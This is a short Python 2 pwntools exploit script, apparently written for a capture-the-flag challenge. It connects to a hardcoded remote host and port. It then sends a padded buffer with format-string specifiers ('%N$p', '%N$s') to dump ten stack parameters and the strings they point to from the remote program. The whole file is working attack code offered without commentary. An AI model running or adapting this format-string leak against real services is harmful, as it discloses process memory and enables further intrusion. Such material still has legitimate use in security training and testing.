#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *


# Set up pwntools for the correct architecture
context.update(arch='i386')

host = '35.237.220.217'
port = 1339

def start():
    return connect(host, port)


#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================


def dump(param, kind="p"):
    io = start()
    io.recvuntil("Name: ")
    payload = 'OUR BUFFER '.ljust(136,"A")

    payload+= "||||"
    payload+= "%" + str(param) + "$"+kind

    io.sendline(payload)

    try:
        data = io.recvline_contains("||||")[4:].strip()
        io.close()
    except:
        io.close()
        return None

    return data
    # allparams.extend(data)


# DUMP PARAMETERS
for i in range(1,11):
    with context.local(log_level='CRITICAL'):
        ptr = dump(i,"p")
        data = dump(i,"s")
    
    print("Param %00d - %10s - %s" % (i, ptr, data))

